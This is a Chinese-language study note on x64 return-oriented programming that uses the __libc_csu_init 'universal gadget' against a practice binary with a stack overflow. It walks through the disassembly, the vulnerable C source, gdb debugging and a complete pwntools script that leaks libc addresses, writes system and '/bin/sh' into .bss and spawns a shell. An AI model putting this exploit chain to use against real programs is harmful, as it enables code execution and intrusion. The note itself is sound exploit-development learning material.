### 通用rop的学习

之 每次看都能发现新东西。



> 在x64下有一些万能gadgets可以利用，比如我们用objdump -d level5观察一下__libc_csu_init()这个函数，一般来说，只要程序调用了libc.so，程序都会有这个函数来对libc进行初始化操作。

我们来看一下函数

```assembly
##libc-2.23.so

00000000004005c0 <__libc_csu_init>:
  4005c0:	41 57                	push   %r15
  4005c2:	41 56                	push   %r14
  4005c4:	41 89 ff             	mov    %edi,%r15d
  4005c7:	41 55                	push   %r13
  4005c9:	41 54                	push   %r12
  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4005d2:	55                   	push   %rbp
  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 <__init_array_end>
  4005da:	53                   	push   %rbx
  4005db:	49 89 f6             	mov    %rsi,%r14
  4005de:	49 89 d5             	mov    %rdx,%r13
  4005e1:	4c 29 e5             	sub    %r12,%rbp
  4005e4:	48 83 ec 08          	sub    $0x8,%rsp
  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp
  4005ec:	e8 0f fe ff ff       	callq  400400 <_init>
  4005f1:	48 85 ed             	test   %rbp,%rbp
  4005f4:	74 20                	je     400616 <__libc_csu_init+0x56>
  4005f6:	31 db                	xor    %ebx,%ebx
  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4005ff:	00
  400600:	4c 89 ea             	mov    %r13,%rdx
  400603:	4c 89 f6             	mov    %r14,%rsi
  400606:	44 89 ff             	mov    %r15d,%edi
  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  40060d:	48 83 c3 01          	add    $0x1,%rbx
  400611:	48 39 eb             	cmp    %rbp,%rbx
  400614:	75 ea                	jne    400600 <__libc_csu_init+0x40>
  400616:	48 83 c4 08          	add    $0x8,%rsp
  40061a:	5b                   	pop    %rbx
  40061b:	5d                   	pop    %rbp
  40061c:	41 5c                	pop    %r12
  40061e:	41 5d                	pop    %r13
  400620:	41 5e                	pop    %r14
  400622:	41 5f                	pop    %r15
  400624:	c3                   	retq
  400625:	90                   	nop
  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40062d:	00 00 00
```



我们看一下地址 0x040061a 到 0x000624我们可以通过将数据填写在栈上来控制寄存器 rbx、rbp、r12、r13、r14、r15的值。然后发现 地址0x400600处，r13修改rdx的值，r14修改rsi的值，r15修改rdi的值，刚好是存储函数参数的三个寄存器。



level5的源码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```

利用思路位：

* 泄漏出write函数的地址，得出libc基地址。

* 通过再次调用write函数将system地址写入到write的got表中。
* 再次调用write函数，实际调用的是system函数，得到shell。



根据利用思路，构造3个payload，我们来调试一下：

```python
from pwn import *

p = process('./level5')
elf = ELF('level5')

p.recvuntil("Hello, World\n")

write_got = elf.got['write']
payload1 = 136*"\x00"  ## *两边不能有空格
payload1 += p64(0x040061a) + p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)
payload1 += p64(0x0400600)
raw_input()

print "\n#############sending payload1#############\n"
p.sendline(payload1)
raw_input()
```



第一个raw_input()是在发送payload之前attach上去，这样能具体的观察到发送前后内存的变化，最后一行raw_input()是在发送payload后挂住脚本防止level5直接退出。

如图所示，进程的PID号为4597.用gdb命令`gdb attach 4597`后即可附加到进程上。在py脚本中按一下回车，这时会执行p.send(payload1)。接下来正式开始调试，以下命令均在gdb中进行。

此时程序执行到read(STDIN_FILENO, buf, 512)，我们按`n`后，程序执行完read，将我们的payload读到了栈上。我们输入了136个`0`，然后是通用gadget的起始位置`0x40061a`。



我们看一下内存情况：

<img src="/Users/liqingyuan/Desktop/1.png" alt="1" style="zoom:50%;" />

可以看到目标寄存器都变成我们要修改的值，然后要跳到0x400600来给 rdi、rsi、rdx赋值，然后再执行call执行，执行write函数，这样就将 write函数的got值打印出来了。打印write函数的之后，我们需要再跳到main函数中，再利用overflow。那main函数的地址应该写在哪里呢？我们继续往下执行看看：



<img src="/Users/liqingyuan/Desktop/2.png" alt="2" style="zoom:50%;" />

执行完call执行之后，会对rbx进行加1的操作，同时比较rbx和rbp的值，相同时zf=1，jne不跳转，继续执行。可以看到rsp所指向地址不断升高，所以接下来需要填充56个字节（都为0），然后又可以跳转到ret所填写的位置。所以payload1的完整写法为：

```python
payload1 = 136*"\x00"  ## *两边不能有空格
payload1 += p64(0x040061a) + p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)
payload1 += p64(0x0400600)
payload1 += 56*"\x00" + p64(main_addr)
```





```python
from pwn import *
#context.log_level = 'debug'
p = process('./level5')
elf = ELF('level5')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
p.recvuntil("Hello, World\n")

write_got = elf.got['write']
main_addr = 0x0400587
read_got = elf.got['read']

payload1 = 136*'\x00'
payload1 += p64(0x040061a) + p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)
payload1 += p64(0x0400600)
payload1 += 56*'\x00'
payload1 += p64(main_addr)
#raw_input()
print "\n#############sending payload1#############\n"
p.sendline(payload1)
#raw_input()
write_addr = u64(p.recv(8))
print "write_addr = "+hex(write_addr)

bss_addr = 0x0601040
p.recvuntil("Hello, World\n")
payload2 = 136*'\x00'
##                覆盖返回地址                  执行的函数   参数三     参数二       参数一
payload2 += p64(0x040061a) + p64(0)+p64(1)+p64(read_got)+p64(16)+p64(bss_addr)+p64(0)
payload2 += p64(0x0400600) ## 将刚才放在栈上的参数放入放入相应的寄存器中。
payload2 += 56*'\x00'
payload2 += p64(main_addr) ##重新返回值main函数 main函数的首地址

print "\n#############sending payload2#############\n"
p.send(payload2)

system_addr = write_addr-(libc.sym['write']-libc.sym['system'])
print "system_addr = "+hex(system_addr)
#payload = p64(system_addr)+"/bin/sh\x00"
p.send(p64(system_addr)+"/bin/sh\x00")

raw_input()

payload3 = 136*'\x00'
payload3 += p64(0x040061a) + p64(0)+p64(1)+p64(bss_addr)+p64(0)+p64(0)+p64(bss_addr+8)
payload3 += p64(0x0400600)
payload3 += 56*'\x00'
payload3 += p64(main_addr)

p.recvuntil("Hello, World\n")

print "\n#############sending payload3#############\n"
p.send(payload3)

p.interactive()
```



###### hex()输出的是字符串，可以和字符串拼接如代码

```python
print "system_addr = "+hex(system_addr)
```

但是如果是 print "system_addr = "+ system_addr 就会 报错，提示两种类型不能进行拼接？

###### 得到got地址之后，将内容进行输出 直接u32(recv()) 得到的就是int型的 可以直接进行加减的地址值。

比如代码如下：

```python
write_addr = u64(p.recv(8))
print "write_addr = "+hex(write_addr)
```

可以看到，如果想和字符串拼接的话，hex可以将地址值转换为十六进制，然后还可以将int型 转换为字符串，进行拼接。





### 参考链接

[一步一步学ROP之Linux_x64篇](https://www.dazhuanlan.com/2019/12/25/5e0299bfd8d89/)

[ROP学习：利用通用gadget]([https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/](https://chybeta.github.io/2017/08/09/ROP学习：利用通用gadget/))

